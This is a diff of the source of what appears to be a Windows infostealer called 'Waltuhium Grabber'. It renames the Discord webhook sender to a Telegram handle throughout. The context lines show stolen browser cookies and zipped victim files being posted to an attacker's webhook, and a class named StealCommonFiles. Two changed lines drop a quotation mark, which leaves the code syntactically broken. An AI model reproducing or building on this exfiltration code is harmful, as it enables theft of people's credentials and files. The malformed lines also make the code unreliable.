@@ -749,7 +749,7 @@ class Main:
                     {"name": "Cookie", "value": "``" + cookie + "``", "inline": False},]
                 embed_data["fields"] = fields
                 payload = {
-                    "username": "Waltuhium Grabber",
+                    "username": "waltuhium | t.me/waltuhium",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -820,7 +820,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Waltuhium Grabber",
+                    "username": "waltuhium | t.me/waltuhium",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -878,7 +878,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Waltuhium Grabber",
+                    "username": "waltuhium | t.me/waltuhium",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -954,7 +954,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Waltuhium Grabber",
+                    "username": "waltuhium | t.me/waltuhium",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -1038,7 +1038,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Waltuhium Grabber",
+                    "username": "waltuhium | t.me/waltuhium",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -1090,7 +1090,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Waltuhium Grabber",
+                    "username": "waltuhium | t.me/waltuhium",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -1160,7 +1160,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Waltuhium Grabber",
+                    "username": "waltuhium | t.me/waltuhium",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -1206,7 +1206,7 @@ class Main:
                     {"name": "Cookie", "value": "```" + str(cookie) + "```", "inline": True},]
                 embed_data["fields"] = fields
                 payload = {
-                    "username": "Waltuhium Grabber",
+                    "username": "waltuhium | t.me/waltuhium",
                     "embeds": [embed_data]
                 }
                 headers2 = {
@@ -1473,7 +1473,7 @@ class Main:
                 embed_data["fields"] = fields
                 async with aiohttp.ClientSession() as session:
                     payload = {
-                        "username": "Waltuhium Grabber",
+                        "username": "waltuhium | t.me/waltuhium",
                         "embeds": [embed_data]
                     }
                     headers = {
@@ -1532,7 +1532,7 @@ class Main:
                                 embed_data["fields"] = fields
                                 async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                                     payload = {
-                                        "username": "Waltuhium Grabber",
+                                        "username": waltuhium | t.me/waltuhium",
                                         "embeds": [embed_data]
                                     }
                                     headers = {
@@ -1812,7 +1812,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Waltuhium Grabber",
+                    "username": "waltuhium | t.me/waltuhium",
                     "embeds": [embed_data] }
                 headers = {
                     "Content-Type": "application/json"}
@@ -1864,7 +1864,7 @@ class Main:
         embed_data["fields"] = fields
         async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
             payload = {
-                "username": "Waltuhium Grabber",
+                "username": "waltuhium | t.me/waltuhium",
                 "embeds": [embed_data] }
             headers = {
                  "Content-Type": "application/json"}
@@ -1893,7 +1893,7 @@ class Main:
                     fields2 = [{"name": "Download Link", "value": f"[{uuid}.zip]({succes})", "inline": True}]
                     embed_data2["fields"] = fields2
                     payload2 = {
-                        "username": "Waltuhium Grabber",
+                        "username": waltuhium | t.me/waltuhium",
                         "embeds": [embed_data2] }
                     async with session.post(webhook, json=payload2) as req:
                         pass
@@ -2075,7 +2075,7 @@ class StealCommonFiles:
                     fields2 = [{"name": "Download Link", "value": f"[Files.zip]({uploaded_url})", "inline": True}]
                     embed_data2["fields"] = fields2
                     payload2 = {
-                                "username": "Waltuhium Grabber",
+                                "username": "waltuhium | t.me/waltuhium",
                                 "embeds": [embed_data2] }
                     async with session.post(webhook, json=payload2) as req:
                         pass
@@ -2404,4 +2404,3 @@ if __name__ == '__main__':
             print(f"\nThe code executed on: {str(time.time() - start_time)} second", end="")
     else:
         print("just Windows Operating system's supported by Waltuhium")
-
